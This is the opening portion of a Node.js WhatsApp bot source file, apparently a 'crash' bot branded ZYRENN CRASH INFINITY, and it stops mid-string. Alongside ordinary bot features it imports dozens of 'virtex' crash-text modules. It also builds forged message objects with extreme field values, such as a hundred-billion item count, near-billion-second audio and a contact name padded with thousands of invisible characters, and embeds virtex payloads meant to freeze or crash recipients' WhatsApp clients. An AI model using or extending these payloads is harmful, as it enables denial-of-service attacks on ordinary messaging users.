/*
› Create By Radit
› Base Ori Radit

🔥 KALAU MAU RENAME TARO CREDITS GUA : 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 */

//=================================================//
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys")
const fs = require("fs")
const util = require("util")
const chalk = require("chalk")
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios")
const path = require("path")
const os = require("os")
const cl = require("caliph-api") 
const crypto = require("crypto")
const hx = require("hxz-api")
const moment = require("moment-timezone")
const maker = require("mumaker")
const { JSDOM } = require("jsdom")
const google = require("google-it")
const mathjs = require("mathjs")
const toMs = require("ms")
const ms = require("parse-ms")
const speed = require("performance-now")
const { performance } = require("perf_hooks")
const { Primbon } = require("scrape-primbon")
const primbon = new Primbon()
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
const textpro = require("../basetzy/lib/textpro")
const cerpen = require("../basetzy/lib/cerpen")
const { color } = require("../basetzy/lib/color")
const { TiktokDownloader } = require("../basetzy/lib/tiktokdl") 
const { formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, calender, reSize, getCase, removebg } = require("../basetzy/lib/myfunc")
const { toPTT, toAudio } = require("../basetzy/lib/converter")
const { mediafireDl } = require("../basetzy/lib/mediafire.js")
const { ringtone, quotesAnime, wikimedia, wallpaper, pinterest, styletext } = require("../basetzy/lib/scraper")
const TicTacToe = require("../basetzy/lib/tictactoe")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require("../basetzy/lib/uploader")
const { ytv, yta } = require("../basetzy/lib/y2mate")
const { jadibot, stopjadibot } = require("../basetzy/lib/jadibot")
//=================================================//
const { teksbanned, tekscmd, bagai, cek1, wa, apa, teksspam, hob, dare, ilhamberkata, ngebucin, katahai, katamalem, katasiang, katasore, katalopyou, tekssalah, badud, ohayo, bapak, anime, bisa, kapan, trut, salam, oawalah, message, regex, allemojinya, thanks, menu, bad, dosa, faktaunik, pantun, truthdare } = require("../message/message")
const { spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam, spam1, khususowner, katakasar } = require("../message/stickerPack")
const { botz, unregister, enggakmau, ucaphai, ucapmalam, ucapsiang, ucappagi, toxicbro, sangebro, spamnih, loplop, ucapsalamikum } = require("../message/vn")
const { menunya } = require("../message/menu")
//=================================================//
const { ngazap } = require("../basetzy/virtex/ngazap")
const { virtex7 } = require("../basetzy/virtex/virtex7")
const { buttonvirus } = require("../basetzy/virtex/buttonvirus")
const { cttl } = require("../basetzy/virtex/cttl")
const { bd } = require("../basetzy/virtex/bd")
const { ft } = require("../basetzy/virtex/ft")
const { place } = require("../basetzy/virtex/place")
const { url } = require("../basetzy/virtex/url")
const { notif1 } = require("../basetzy/virtex/notif1")
const { notif2 } = require("../basetzy/virtex/notif2")
const { notif3 } = require("../basetzy/virtex/notif3")
const { notif4 } = require("../basetzy/virtex/notif4")
const { tizi } = require("../basetzy/virtex/tizi")
const { pen } = require("../basetzy/virtex/pen")
const { mata1 } = require("../basetzy/virtex/mata1")
const { ker } = require("../basetzy/virtex/ker")
const { mata } = require("../basetzy/virtex/mata")
const { weg } = require("../basetzy/virtex/weg")
const { aud } = require("../basetzy/virtex/aud")
const { aud1 } = require("../basetzy/virtex/aud1")
const { pvz3 } = require("../basetzy/virtex/pvz3")
const { pvm3 } = require("../basetzy/virtex/pvm3")
const { funer } = require("../basetzy/virtex/funer")
const { pv3m } = require("../basetzy/virtex/pv3m")
const { lugia } = require("../basetzy/virtex/lugia")
const { malvadinha } = require("../basetzy/virtex/malvadinha")
const { explosion } = require("../basetzy/virtex/explosion")
const { parando } = require("../basetzy/virtex/parando")
const { killed } = require("../basetzy/virtex/killed")
const { cova } = require("../basetzy/virtex/cova")
const { sumiu } = require("../basetzy/virtex/sumiu")
const { destroi } = require("../basetzy/virtex/destroi")
const { voids } = require("../basetzy/virtex/voids")
const { explosionios } = require("../basetzy/virtex/explosionios")
const { buttontzy } = require("../basetzy/virtex/buttontzy")
const { vimg } = require("../basetzy/virtex/vimg")
const { vimgesw } = require("../basetzy/virtex/vimgesw")
const { qpeh } = require("../basetzy/virtex/qpeh")
const { konf } = require("../basetzy/virtex/konf")
const { vnolim } = require("../basetzy/virtex/vnolim")
const { mnth } = require("../basetzy/virtex/mnth")
const { mnth1 } = require("../basetzy/virtex/mnth1")
const { mt1 } = require("../basetzy/virtex/mt1")
const { mt2 } = require("../basetzy/virtex/mt2")
const { mt3 } = require("../basetzy/virtex/mt3")
//=================================================//
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
let dataId = db.data.data
//=================================================//
// Time & Date
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
if(time2 < "23:59:00"){
var ucapanWaktu = "Selamat Malam"
}
if(time2 < "19:00:00"){
var ucapanWaktu = "Selamat Petang"
 }
if(time2 < "18:00:00"){
var ucapanWaktu = "Selamat Sore"
 }
if(time2 < "15:00:00"){
var ucapanWaktu = "Selamat Siang"
 }
if(time2 < "11:00:00"){
var ucapanWaktu = "Selamat Pagi"
 }
if(time2 < "05:00:00"){
var ucapanWaktu = "Selamat Malam"
 }
const time = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam2 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
// Date
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = zyren = async (zyren, m, chatUpdate, store) => {
const qtod = m.quoted? true : false
require("./database")(zyren, m)
try{
//=================================================//
try{
var ownerNumber = db.data.settings[zyren.decodeJid(zyren.user.id)].nomerowner
} catch {
var ownerNumber = nomerOwner
}
try{
var ownerName = db.data.settings[zyren.decodeJid(zyren.user.id)].namaowner
} catch {
var ownerName = namaOwner
}
try{
var copyright = db.data.settings[zyren.decodeJid(zyren.user.id)].copyright
} catch {
var copyright = footer
}
//=================================================//
const content = JSON.stringify(m.message)
const body = m.mtype === "conversation"? m.message.conversation: m.mtype == "imageMessage"? m.message.imageMessage.caption: m.mtype == "videoMessage"? m.message.videoMessage.caption: m.mtype == "extendedTextMessage"? m.message.extendedTextMessage.text: m.mtype == "buttonsResponseMessage"? m.message.buttonsResponseMessage.selectedButtonId: m.mtype == "listResponseMessage"? m.message.listResponseMessage.singleSelectReply.selectedRowId: m.mtype == "templateButtonReplyMessage"? m.message.templateButtonReplyMessage.selectedId: m.mtype === "messageContextInfo"? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId: ""
const budy = m.mtype === "conversation" ? m.message.conversation : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : ""
const messagesC = budy.slice(0).trim()
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await zyren.decodeJid(zyren.user.id)
const isCreator = [botNumber, ownerNumber + "@s.whatsapp.net", ...Object.keys(db.data.owner)].includes(m.sender)
const isDevoloper = [botNumber, ownerNumber + "@s.whatsapp.net"].includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const listblock = await zyren.fetchBlocklist()
const isBan = Object.keys(db.data.banned).includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const from = mek.key.remoteJid
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"        
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
//=================================================//
const groupMetadata = m.isGroup ? await zyren.groupMetadata(m.chat).catch(e => {}) : ""
const groupName = m.isGroup ? groupMetadata.subject : ""
const participants = m.isGroup ? await groupMetadata.participants : ""
const groupAdmins = m.isGroup? await participants.filter(v => v.admin !== null).map(x => x.id) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAntiLink = m.isGroup ? db.data.chats[m.chat].antilink : false 
const isAntiLinkGroup = m.isGroup ? db.data.chats[m.chat].antilinkgc : false 
const isAntiLinkYtChannel = m.isGroup ? db.data.chats[m.chat].antilinkytchannel : false 
const isAntiLinkYtVideo = m.isGroup ? db.data.chats[m.chat].antilinkytvideo : false 
const isAntiLinkFacebook = m.isGroup ? db.data.chats[m.chat].antilinkfb : false 
const isAntiLinkInstagram = m.isGroup ? db.data.chats[m.chat].antilinkig : false 
const isAntiLinkTelegram = m.isGroup ? db.data.chats[m.chat].antilinktele : false 
const isAntiLinkWhatsapp = m.isGroup ? db.data.chats[m.chat].antilinkwa : false 
const isAntiLinkTiktok = m.isGroup ? db.data.chats[m.chat].antilinktiktok : false 
const isAntiLinkTwitter = m.isGroup ? db.data.chats[m.chat].antilinktwitter : false 
const isAntiVirtex = m.isGroup ? db.data.chats[m.chat].antivirtex : false 
const isAntiAsing = m.isGroup ? db.data.chats[m.chat].antiasing : false 
const isAntiTag = m.isGroup ? db.data.chats[m.chat].antitag : false 
const isAntiDelete = m.isGroup ? db.data.chats[m.chat].antidelete : false
const isAntiViewOnce = m.isGroup ? db.data.chats[m.chat].antiviewonce : false
const isAntiToxic = m.isGroup ? db.data.chats[m.chat].antitoxic : false
const isAntiSange = m.isGroup ? db.data.chats[m.chat].antisange : false
const isAntiNsfw = m.isGroup ? db.data.chats[m.chat].antinsfw : false
const isAutoResponGroup = m.isGroup ? db.data.chats[m.chat].autorespongc : false
const isAutoReact = m.isGroup ? db.data.chats[m.chat].autoreact : false
const isAutoBugReact = m.isGroup ? db.data.chats[m.chat].autobugreact : false
const isBanchat = m.isGroup ? db.data.chats[m.chat].mute : false
const isWelcome = m.isGroup ? db.data.chats[m.chat].welcome : false
//=================================================//
const isImage = m.mtype === "imageMessage"
const isVideo = m.mtype === "videoMessage"
const isSticker = m.mtype == "stickerMessage"
const isAudio = m.mtype == "audioMessage"
const isText = m.mtype == "conversation"
const isMedia = m.mtype === "imageMessage" || m.mtype === "videoMessage"        
const isViewOnce = m.mtype == "viewOnceMessage"        
const isAllMedia = m.mtype === "imageMessage" || m.mtype === "videoMessage" || m.mtype === "stickerMessage" || m.mtype === "audioMessage" || m.mtype === "contactMessage" || m.mtype === "locationMessage" || m.mtype == "viewOnceMessage"
const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactMessage")
const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAllMedia = m.mtype === "extendedTextMessage" && content.includes("imageMessage") || m.mtype === "extendedTextMessage" && content.includes("locationMessage") || m.mtype === "extendedTextMessage" && content.includes("videoMessage") || m.mtype === "extendedTextMessage" && content.includes("stickerMessage") || m.mtype === "extendedTextMessage" && content.includes("audioMessage") || m.mtype === "extendedTextMessage" && content.includes("contactMessage") || m.mtype === "extendedTextMessage" && content.includes("documentMessage") || m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
const isQuotedTeks = m.mtype === "extendedTextMessage" && content.includes("quotedMessage")
const isQuotedTag = m.mtype === "extendedTextMessage" && content.includes("mentionedJid")
const isQuotedReply = m.mtype === "extendedTextMessage" && content.includes("Message")
const isQuotedText = m.mtype === "extendedTextMessage" && content.includes("conversation")
const isQuotedextendedText = m.mtype === "extendedTextMessage" && content.includes("extendedTextMessage")
const isReplySticker = m.mtype === "stickerMessage" && content.includes("stickerMessage")
const isQuotedReplySticker = m.mtype === "stickerMessage" && content.includes("extendedTextMessage")
const mentionByReplySticker = m.mtype == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : ""
//=================================================//
const iyakak = zyren.pickRandom(botz)
const ucapbot = fs.readFileSync(iyakak)
const unreg = zyren.pickRandom(unregister)
const gakada = fs.readFileSync(unreg)
const lusange = zyren.pickRandom(sangebro)
const sangeya = fs.readFileSync(lusange)
const anying = zyren.pickRandom(toxicbro)
const astaga = fs.readFileSync(anying)
const ahenggak = zyren.pickRandom(enggakmau)
const gakmau = fs.readFileSync(ahenggak)
const ay = zyren.pickRandom(ucappagi)
const oahyo = fs.readFileSync(ay)
const ayuk = zyren.pickRandom(ucapmalam)
const oyasumi = fs.readFileSync(ayuk)
const yayuk = zyren.pickRandom(ucapsiang)
const koniciwa = fs.readFileSync(yayuk)
const alal = zyren.pickRandom(spamnih)
const nospam = fs.readFileSync(alal)
const ulul = zyren.pickRandom(ucaphai)
const moshimos = fs.readFileSync(ulul)
const alul = zyren.pickRandom(ucapsalamikum)
const walaikumsalam = fs.readFileSync(alul)
const awlu = zyren.pickRandom(loplop)
const lopyoutoo = fs.readFileSync(awlu)
const textcmd = zyren.pickRandom(tekscmd)
const textspam = zyren.pickRandom(teksspam)
//=================================================//
// Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const tzy = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) },"message": {"extendedTextMessage": {"text": "㑒 𝐏𝐚𝐤 - 𝐓𝐳𝐲 ϟ〽️","previewType": "NONE","contextInfo": {"stanzaId": "3EB0382EDBB2","participant": "6281991410940@s.whatsapp.net" }}}}
const pak = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"extendedTextMessage": {"text": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘️","previewType": "NONE","contextInfo": {"stanzaId": "3EB0382EDBB2","participant": "@s.whatsapp.net"}}}}
const kel = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/ApPRbzvidZuNpHcHsCn2P1rVHawvt2T63DCZMyWnAgQZ.enc","fileSha256": "czwy7lIUZuU8GL9W2UP3sSo/vy9FlETMpqpQneQQ+w8=","fileEncSha256": "xOjP90WLzICVTQQvj7Ts+oJvcxhas5oOEPMvoqKVQ1E=","mediaKey": "/j2BjzjS/e88MHVCcaS8f3kaSCAVe18Nv4tQb/rZtrc=","mimetype": "image/webp","directPath": "/v/t62.7118-24/25076345_285509236738530_1931711252260953768_n.enc?ccb=11-4&oh=f6ef4b023e7424d5d2c4d03923c0ab1b&oe=616F03EF","height": 150000,"width": 150000,"fileLength": "10124","mediaKeyTimestamp": "1632147575","isAnimated": false}}}
const doc = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc","mimetype": "application/octet-stream","fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=","fileLength": "64455","pageCount": 1,"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=","fileName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
const trol = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"orderMessage": {"orderId": "594071395007984","thumbnail": fs.readFileSync("./media/gambarnye/thezyren.jpg"),"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘","orderTitle": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ","sellerJid": "62857887347569@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR"}}}
const ngetrol = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"orderMessage": {"orderId": "594071395007984","thumbnail": fs.readFileSync("./media/gambarnye/thezyren.jpg"),"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘","orderTitle": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}","sellerJid": "62857887347569@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR" }}}
const ftrolii ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},"message": {orderMessage: {itemCount: 100000000000,status: 200, thumbnail: logonya, surface: 200, message: `${ownerName}`,token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",totalAmount1000: "500000000000000",totalCurrencyCode: "IDR",orderTitle: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${ngazap(prefix)}`,sellerJid: "0@s.whatsapp.net"}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const ft = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message":{"imageMessage":{"mimetype":"image/jpeg","jpegThumbnail":fs.readFileSync("./media/gambarnye/thezyren.jpg")}}}
const gc = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"groupInviteMessage": {"groupJid": "120363025461390219@g.us","inviteCode": "z0JcSBd3mAhIfSSY","inviteExpiration": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ","groupName": "𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥","caption": "𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥"}}}
const lok = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"locationMessage": {}}}
const aud = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc","mimetype": "audio/aac","fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=","fileLength": "285473","seconds": 999999999,"caption": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   `,"ptt": false,"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=","fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=","directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB","mediaKeyTimestamp": "1632753911"}}}
const kon = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎